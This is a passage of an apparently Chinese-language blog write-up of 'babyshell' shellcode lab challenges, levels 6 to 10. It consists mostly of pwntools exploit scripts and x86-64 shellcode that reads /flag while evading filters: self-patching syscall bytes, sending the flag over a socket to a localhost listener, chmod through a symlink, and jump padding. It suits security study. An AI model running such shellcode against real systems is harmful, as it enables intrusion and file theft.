xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    mov dil, 2</span></span><br><span class="line"><span class="string">    mov al, 3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_close = asm(shellcode_close)</span><br><span class="line">shellcode += shellcode_close</span><br><span class="line">syscall = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">syscall = asm(syscall)</span><br><span class="line">after_syscall = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="string">b&#x27;\x90\x90&#x27;</span>, syscall))</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mov rbx, 0x0067616c662f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_open = asm(shellcode_open)</span><br><span class="line">shellcode += shellcode_open</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    mov al, 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_read = asm(shellcode_read)</span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode_write = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_write = asm(shellcode_write)</span><br><span class="line">shellcode += shellcode_write</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line"></span><br><span class="line">shellcode_exit = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_exit = asm(shellcode_exit)</span><br><span class="line">shellcode += shellcode_exit</span><br><span class="line">syscall = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rbx, <span class="subst">&#123;leak_addr + <span class="built_in">len</span>(shellcode) + <span class="number">14</span>&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx], <span class="subst">&#123;after_syscall[<span class="number">0</span>]&#125;</span></span></span><br><span class="line"><span class="string">    xor byte ptr [rbx+1], <span class="subst">&#123;after_syscall[<span class="number">1</span>]&#125;</span></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(syscall)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x2000 bytes from stdin.\n&#x27;</span>,shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># h = p.recv(0x2000)</span></span><br><span class="line"><span class="comment"># print(h)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-7"><a class="markdownIt-Anchor" href="#level-7">#</a> level 7</h3>
<p>ban stdin stdout stderr，这里用 socket 来传</p>
<p>开 server 接：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_server</span>(<span class="params">host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5678</span></span>):</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">        server_socket.bind((host, port))</span><br><span class="line"></span><br><span class="line">        server_socket.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        client_socket, addr = server_socket.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Accepted a connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        data = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received data:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line">        client_socket.close()</span><br><span class="line">        server_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_server()</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./level6_chall&#x27;,&#x27;b *main\nb *main + 957\nb *main + 525&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyshell_level7&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Mapped 0x4000 bytes for shellcode at &#x27;</span>)</span><br><span class="line">leak_addr = p.recvn(<span class="number">10</span>).decode()</span><br><span class="line">leak_addr = <span class="built_in">int</span>(leak_addr, <span class="number">16</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// socket:</span></span><br><span class="line"><span class="string">    mov rdi, 2</span></span><br><span class="line"><span class="string">    mov rsi, 1</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 41</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov r9, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//  socket addr preparation</span></span><br><span class="line"><span class="string">    sub rsp, 4</span></span><br><span class="line"><span class="string">    mov word ptr [rsp + 0], 2</span></span><br><span class="line"><span class="string">    mov word ptr [rsp + 2], 0x2e16</span></span><br><span class="line"><span class="string">    mov dword ptr [rsp + 4], 0x0100007f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//  connect</span></span><br><span class="line"><span class="string">    mov rdx, 16</span></span><br><span class="line"><span class="string">    mov rax, 42</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//    mov rcx, rax // socket descriptor</span></span><br><span class="line"><span class="string">    mov rcx, rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// close:</span></span><br><span class="line"><span class="string">    mov rdi, 2</span></span><br><span class="line"><span class="string">    mov rax, 3</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// open:</span></span><br><span class="line"><span class="string">    mov rbx, 0x0067616c662f</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// read:</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// write:</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rdi, r9</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rax, 3</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// exit</span></span><br><span class="line"><span class="string">    mov rax, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x4000 bytes from stdin.\n&#x27;</span>,shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># h = p.recv(0x2000)</span></span><br><span class="line"><span class="comment"># print(h)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-8"><a class="markdownIt-Anchor" href="#level-8">#</a> level 8</h3>
<p>0x12 bytes，用的是 chmod (‘file’,7)， <code>ln -s /flag f</code>  软链接到 f 上来节约字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.text</span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">    mov al, 0x5a</span><br><span class="line">    mov sil, 7</span><br><span class="line">    push 0x66     </span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<blockquote>
<p>cat flag</p>
</blockquote>
<h3 id="level-9"><a class="markdownIt-Anchor" href="#level-9">#</a> level 9</h3>
<p>每十个会 CC 十个，那么写一个生成 shellcode，使得超过 10 个的时候会加入一个 jmp（注意不能用 qword mov 这种大于等于八字节的指令，算是这题隐性的 ban list）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;    mov rdi, 2</span></span><br><span class="line"><span class="string">    mov rax, 3</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    sub rsp, 5</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp], 0x2f</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+1], 0x66</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+2], 0x6c</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+3], 0x61</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+4], 0x67</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    sub byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov dil, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 0x3c</span></span><br><span class="line"><span class="string">    syscall&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_list = shellcode.splitlines()</span><br><span class="line"><span class="comment"># print(shellcode_list)</span></span><br><span class="line">shellcode_tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode_len = <span class="number">0</span></span><br><span class="line">shellcode_pad_flag = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="built_in">len</span>(shellcode_list)):</span><br><span class="line">    <span class="comment"># print(f&#x27;shellcode_tmp [&#123;i&#125;]: \n&#x27;,shellcode_tmp)</span></span><br><span class="line">    <span class="keyword">if</span> ((shellcode_len // <span class="number">10</span>) % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> shellcode_pad_flag == <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (shellcode_len % <span class="number">10</span> &lt;= <span class="number">8</span>):</span><br><span class="line">            random_str = <span class="string">&#x27;&#x27;</span>.join(choices(string.ascii_letters, k=<span class="number">4</span>))</span><br><span class="line">            pad = -(shellcode_len % <span class="number">10</span>) + <span class="number">8</span> + <span class="number">10</span></span><br><span class="line">            shellcode_tmp += <span class="string">f&quot;    jmp <span class="subst">&#123;random_str&#125;</span>\n    .rept <span class="subst">&#123;pad&#125;</span>\n    nop\n    .endr\n<span class="subst">&#123;random_str&#125;</span>:\n&quot;</span></span><br><span class="line">            shellcode_len += pad + <span class="number">2</span></span><br><span class="line">            shellcode_pad_flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shellcode_pad_flag = <span class="number">1</span></span><br><span class="line">            shellcode_len -= <span class="built_in">len</span>(asm(shellcode_list[i - <span class="number">1</span>]))</span><br><span class="line">            tmp = shellcode_tmp.splitlines()</span><br><span class="line">            tmp = tmp[:-<span class="number">1</span>]</span><br><span class="line">            shellcode_tmp = <span class="string">&#x27;\n&#x27;</span>.join(tmp)</span><br><span class="line">            shellcode_tmp += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">elif</span> ((shellcode_len // <span class="number">10</span>) % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> shellcode_pad_flag == <span class="number">0</span>):</span><br><span class="line">        shellcode_tmp += shellcode_list[i] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        shellcode_len += <span class="built_in">len</span>(asm(shellcode_list[i]))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">elif</span> ((shellcode_len // <span class="number">10</span>) % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">        shellcode_len -= <span class="built_in">len</span>(asm(shellcode_list[i - <span class="number">1</span>]))</span><br><span class="line">        tmp = shellcode_tmp.splitlines()</span><br><span class="line">        tmp = tmp[:-<span class="number">1</span>]</span><br><span class="line">        shellcode_tmp = <span class="string">&#x27;\n&#x27;</span>.join(tmp)</span><br><span class="line">        shellcode_tmp += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        shellcode_pad_flag = <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(shellcode_tmp)</span><br></pre></td></tr></table></figure>
<p>生成的 exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.syntax = &#x27;intel&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(flag_file)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;    mov rdi, 2</span></span><br><span class="line"><span class="string">    jmp EIBi</span></span><br><span class="line"><span class="string">    .rept 11</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">EIBi:</span></span><br><span class="line"><span class="string">    mov rax, 3</span></span><br><span class="line"><span class="string">    jmp wIoJ</span></span><br><span class="line"><span class="string">    .rept 11</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">wIoJ:</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    jmp GGxU</span></span><br><span class="line"><span class="string">    .rept 10</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">GGxU:</span></span><br><span class="line"><span class="string">    sub rsp, 5</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp], 0x2f</span></span><br><span class="line"><span class="string">    jmp HIQh</span></span><br><span class="line"><span class="string">    .rept 10</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">HIQh:</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+1], 0x66</span></span><br><span class="line"><span class="string">    jmp hAbJ</span></span><br><span class="line"><span class="string">    .rept 13</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">hAbJ:</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+2], 0x6c</span></span><br><span class="line"><span class="string">    jmp bxUa</span></span><br><span class="line"><span class="string">    .rept 13</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">bxUa:</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+3], 0x61</span></span><br><span class="line"><span class="string">    jmp JNPB</span></span><br><span class="line"><span class="string">    .rept 13</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">JNPB:</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+4], 0x67</span></span><br><span class="line"><span class="string">    jmp GoxX</span></span><br><span class="line"><span class="string">    .rept 13</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">GoxX:</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    jmp xzHp</span></span><br><span class="line"><span class="string">    .rept 13</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">xzHp:</span></span><br><span class="line"><span class="string">    sub byte ptr [rsp+5], 0x01</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    jmp UTod</span></span><br><span class="line"><span class="string">    .rept 11</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">UTod:</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    jmp Imgn</span></span><br><span class="line"><span class="string">    .rept 11</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">Imgn:</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    jmp EDoc</span></span><br><span class="line"><span class="string">    .rept 15</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">EDoc:</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    jmp qLZG</span></span><br><span class="line"><span class="string">    .rept 11</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">qLZG:</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    jmp AbtY</span></span><br><span class="line"><span class="string">    .rept 10</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">AbtY:</span></span><br><span class="line"><span class="string">    mov dil, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">    jmp UuTH</span></span><br><span class="line"><span class="string">    .rept 10</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    .endr</span></span><br><span class="line"><span class="string">UuTH:</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rax, 0x3c</span></span><br><span class="line"><span class="string">    syscall&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">hex_shellcode = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(hex_shellcode)</span><br><span class="line">p = gdb.debug(<span class="string">&#x27;./level9_chall_cp&#x27;</span>,<span class="string">&#x27;b *main\nb *main + 912&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./level9_chall_cp&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,hex_shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># p.send(hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="level-10"><a class="markdownIt-Anchor" href="#level-10">#</a> level 10</h3>
<p>要求从小到大，可以开始查一些单字节双字节指令插进去（这题用的多的是 nop）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.syntax = &#x27;intel&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(flag_file)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">//  open</span></span><br><span class="line"><span class="string">    mov rbx, 0x67616c662f</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// read</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov dl, 0x50</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">// write</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov dil, 1</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov al, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    inc rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">hex_shellcode = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(hex_shellcode)</span><br><span class="line"><span class="comment"># p = 